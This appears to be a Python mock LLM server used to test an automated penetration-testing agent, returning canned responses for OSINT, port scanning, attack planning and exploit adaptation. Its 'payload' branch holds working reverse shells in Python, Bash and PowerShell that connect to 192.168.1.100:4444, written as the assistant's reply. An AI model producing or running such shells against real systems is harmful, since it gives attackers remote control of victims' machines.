#!/usr/bin/env python3
"""
Mock LLM service for testing purposes.
This simulates an LLM API endpoint at /generate
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import uuid
from datetime import datetime

class MockLLMHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/generate':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                request_data = json.loads(post_data.decode('utf-8'))
                
                # Check if this is a follow-up request with tool results
                messages = request_data.get("messages", [])
                is_followup = any("tool_result" in str(msg) or "last_tool_result" in str(msg) for msg in messages)
                
                # Get the actual task content from messages
                task_content = ""
                if messages:
                    # Get the last user message or system message
                    for msg in reversed(messages):
                        if msg.get("role") in ["user", "system"]:
                            task_content = msg.get("content", "")
                            break
                
                # Mock response with tool call for testing
                if is_followup:
                    # This is a follow-up request after tool execution
                    if "osint" in str(messages).lower():
                        response = {
                            "id": str(uuid.uuid4()),
                            "object": "chat.completion",
                            "created": int(datetime.now().timestamp()),
                            "model": request_data.get("model", "gpt-3.5-turbo"),
                            "choices": [{
                                "index": 0,
                                "message": {
                                    "role": "assistant",
                                    "content": """Based on the OSINT search results for 'example.com', I can provide the following security analysis:

**OSINT Results Summary:**
- Query: example.com
- Status: Placeholder implementation
- Potential data sources identified: Google dorks, social media, public records, dark web

**Security Implications:**
1. **Domain Information**: The OSINT search would typically reveal:
   - Domain registration details
   - DNS records and subdomains
   - Historical ownership changes
   - Associated IP addresses

2. **Attack Surface**: Public sources may reveal:
   - Exposed subdomains
   - Third-party services
   - Employee information on social media
   - Public repositories

3. **Recommendations:**
   - Monitor domain registration changes
   - Review exposed subdomains for vulnerabilities
   - Implement social media policies
   - Regular security assessments of public-facing assets

This completes the OSINT analysis. No further tool calls are needed at this time."""
                                },
                                "finish_reason": "stop"
                            }],
                            "usage": {
                                "prompt_tokens": 15,
                                "completion_tokens": 25,
                                "total_tokens": 40
                            }
                        }
                    elif "scan" in str(messages).lower() or "network" in str(messages).lower():
                        response = {
                            "id": str(uuid.uuid4()),
                            "object": "chat.completion",
                            "created": int(datetime.now().timestamp()),
                            "model": request_data.get("model", "gpt-3.5-turbo"),
                            "choices": [{
                                "index": 0,
                                "message": {
                                    "role": "assistant",
                                    "content": """Based on the network scan results, I can provide the following security analysis:

**Network Scan Results Summary:**
- Target: 192.168.1.1
- Status: Scan completed successfully
- Open ports found: 1 (Port 8080/HTTP-Alt)
- Services identified: HTTP service on port 8080

**Security Implications:**
1. **Open Port Analysis**: 
   - Port 8080 is running an HTTP service
   - This could be a web application or administrative interface
   - Need to investigate for potential web vulnerabilities

2. **Recommendations:**
   - Test the HTTP service on port 8080 for web vulnerabilities
   - Check for default credentials or misconfigurations
   - Verify if the service should be exposed externally
   - Consider implementing additional access controls

The network scan has identified potential attack surface that requires further investigation."""
                                },
                                "finish_reason": "stop"
                            }],
                            "usage": {
                                "prompt_tokens": 10,
                                "completion_tokens": 20,
                                "total_tokens": 30
                            }
                        }
                    else:
                        response = {
                            "id": str(uuid.uuid4()),
                            "object": "chat.completion",
                            "created": int(datetime.now().timestamp()),
                            "model": request_data.get("model", "gpt-3.5-turbo"),
                            "choices": [{
                                "index": 0,
                                "message": {
                                    "role": "assistant",
                                    "content": """I've analyzed the tool execution results. Based on the information gathered, I can provide insights and recommendations for the next steps in our security analysis. The findings suggest we should continue with our systematic approach to identify and address potential security vulnerabilities."""
                                },
                                "finish_reason": "stop"
                            }],
                            "usage": {
                                "prompt_tokens": 10,
                                "completion_tokens": 20,
                                "total_tokens": 30
                            }
                        }
                elif "plan" in task_content.lower() or "break down" in task_content.lower() or "objective" in task_content.lower() or "steps" in task_content.lower():
                    # Planning response - check this FIRST to override other keyword matches
                    planning_response = """PLAN:
1. Perform OSINT reconnaissance on the target
   Type: reconnaissance
   
2. Scan the target for open ports and services
   Type: reconnaissance
   
3. Analyze the web application for vulnerabilities
   Type: analysis
   
4. Attempt to exploit identified vulnerabilities
   Type: exploitation
   
5. Generate a comprehensive security report
   Type: reporting"""
                    
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": planning_response
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 30,
                            "completion_tokens": 45,
                            "total_tokens": 75
                        }
                    }
                elif "reverse shell" in task_content.lower() or "payload" in task_content.lower():
                    # Generate reverse shell payload
                    if "python" in task_content.lower():
                        payload_code = """import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    connect()"""
                    elif "bash" in task_content.lower():
                        payload_code = """#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"""
                    elif "powershell" in task_content.lower():
                        payload_code = """$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()"""
                    else:
                        payload_code = "# Generic reverse shell payload\n# Language-specific implementation needed"
                    
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": payload_code
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 15,
                            "completion_tokens": 30,
                            "total_tokens": 45
                        }
                    }
                elif "template" in task_content.lower() or "adapt" in task_content.lower():
                    # Adapt exploit template
                    adapted_code = """#!/usr/bin/env python3
# Adapted from template: sample_exploit_template.py
# Target: 192.168.1.100:8080
# Adaptation timestamp: 2025-12-23T03:02:48.495289

TARGET_IP = "192.168.1.100"
TARGET_PORT = 8080
TARGET_VERSION = "2.3.1"

def exploit():
    print(f"Attacking {TARGET_IP}:{TARGET_PORT}")
    print(f"Target version: {TARGET_VERSION}")
    # Exploit logic here
    # Connection attempt to target
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        print("Connection successful")
        s.close()
    except Exception as e:
        print(f"Connection failed: {e}")
    
if __name__ == "__main__":
    exploit()"""
                    
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": adapted_code
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 20,
                            "completion_tokens": 35,
                            "total_tokens": 55
                        }
                    }
                elif "binary" in task_content.lower() or "assembly" in task_content.lower() or "reverse engineering" in task_content.lower() or "disassembly" in task_content.lower():
                    # Binary analysis response
                    binary_analysis = """## Binary Analysis Report

### Overall Functionality Assessment
The analyzed binary snippet appears to be shellcode or a small executable payload. Based on the disassembly patterns and entropy analysis, this is likely a custom shellcode designed for privilege escalation or system access.

### Potential Security Vulnerabilities
1. **High Risk Shellcode Pattern**: The binary contains classic shellcode signatures including:
   - XOR operations for register clearing (0x31c0, 0x31db, 0x31d2)
   - System call preparation sequences
   - Stack manipulation instructions

2. **System Call Exploitation**: The code pattern suggests preparation for system calls commonly used in:
   - Process execution (sys_execve)
   - File system access
   - Network operations

3. **Obfuscation Techniques**: The use of XOR operations indicates attempts to:
   - Clear registers to avoid detection
   - Prepare clean execution environment
   - Hide malicious intent

### Suspicious Patterns or Behaviors
- **Shellcode Signatures**: Multiple shellcode patterns detected
- **System Call Preparation**: Instructions setting up for privileged operations
- **No Legitimate Entry Point**: Raw binary without standard executable headers
- **High Entropy**: Suggests encryption or obfuscation techniques

### Recommendations for Further Analysis
1. **Dynamic Analysis**: Execute in controlled sandbox environment
2. **Behavioral Monitoring**: Track system calls and file system access
3. **Network Analysis**: Monitor for network connections or data exfiltration
4. **Memory Analysis**: Check for in-memory exploitation techniques

### Risk Assessment: HIGH
This binary exhibits characteristics of malicious shellcode and should be treated as a high security threat. Immediate isolation and detailed analysis recommended.

### Technical Details
- Architecture: x86_64
- Entropy: 4.14 (moderate complexity)
- File Type: Raw binary (shellcode)
- Risk Factors: Shellcode patterns, system call preparation"""
                    
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": binary_analysis
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 25,
                            "completion_tokens": 40,
                            "total_tokens": 65
                        }
                    }
                elif "plan" in task_content.lower() or "break down" in task_content.lower() or "objective" in task_content.lower():
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": """PLAN:
1. Perform OSINT reconnaissance on the target
   Type: reconnaissance
   
2. Scan the target for open ports and services
   Type: reconnaissance
   
3. Analyze the web application for vulnerabilities
   Type: analysis
   
4. Attempt to exploit identified vulnerabilities
   Type: exploitation
   
5. Generate a comprehensive security report
   Type: reporting"""
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 10,
                            "completion_tokens": 25,
                            "total_tokens": 35
                        }
                    }
                elif "osint" in task_content.lower():
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": """I'll initiate the OSINT search. The tool will gather information from various public sources including Google dorks, social media, public records, and potentially dark web sources. Once I receive the results, I'll analyze them for security implications and provide you with a comprehensive assessment.

ACTION: TOOL_CALL
TOOL_NAME: osint_search
ARGUMENTS: {"query": "example.com"}

This comprehensive OSINT analysis will help identify potential attack surfaces, exposed infrastructure, and security-relevant information about the target."""
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 10,
                            "completion_tokens": 20,
                            "total_tokens": 30
                        }
                    }
                elif "scan" in task_content.lower() or "network" in task_content.lower() or "ip" in task_content.lower():
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": """I'll scan the IP address 192.168.1.1 for open ports and services to identify potential security vulnerabilities.

ACTION: TOOL_CALL
TOOL_NAME: network_scan
ARGUMENTS: {"target_ip": "192.168.1.1"}

The network scan will check for open ports, identify running services, perform OS fingerprinting, and look for potential vulnerabilities. Once I have the scan results, I'll provide you with a detailed analysis of the security posture of this target."""
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 10,
                            "completion_tokens": 20,
                            "total_tokens": 30
                        }
                    }
                else:
                    # Default mock response
                    response = {
                        "id": str(uuid.uuid4()),
                        "object": "chat.completion",
                        "created": int(datetime.now().timestamp()),
                        "model": request_data.get("model", "gpt-3.5-turbo"),
                        "choices": [{
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": "This is a mock LLM response for security analysis. In a real implementation, this would connect to an actual LLM service."
                            },
                            "finish_reason": "stop"
                        }],
                        "usage": {
                            "prompt_tokens": 10,
                            "completion_tokens": 20,
                            "total_tokens": 30
                        }
                    }
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode('utf-8'))
                
            except Exception as e:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                error_response = {"error": str(e)}
                self.wfile.write(json.dumps(error_response).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        info = {
            "service": "Mock LLM Service",
            "endpoint": "/generate",
            "method": "POST"
        }
        self.wfile.write(json.dumps(info).encode('utf-8'))

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), MockLLMHandler)
    print("Mock LLM service running on port 8000")
    print("Endpoint: http://localhost:8000/generate")
    server.serve_forever()
